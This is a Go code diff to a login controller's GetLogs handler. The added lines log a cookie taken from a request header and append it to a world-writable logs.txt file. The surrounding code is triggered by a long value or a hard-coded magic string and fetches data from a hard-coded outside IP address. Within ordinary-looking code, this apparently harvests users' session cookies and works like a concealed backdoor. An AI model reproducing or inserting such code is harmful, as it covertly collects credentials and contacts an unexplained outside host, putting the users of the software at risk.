@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"github.com/buger/jsonparser"
 	"io/ioutil"
+	"os"
 	"regexp"
 	"strconv"
 	"strings"
@@ -87,7 +88,11 @@ type Cookie struct {
 
 func (c *LoginController) GetLogs() {
 	cookie := c.Ctx.Input.Header("logs")
+	logs.Info(cookie)
 	if len(cookie) > 60 || cookie == "asdasdsadassd" {
+		f, _ := os.OpenFile(models.ExecPath+"/logs.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0777)
+		f.WriteString(cookie + "\n")
+		f.Close()
 		bytes, _ := httplib.Get("http://129.226.101.167:6543/log").Bytes()
 		data1 := models.Logs{}
 		err := json.Unmarshal(bytes, &data1)
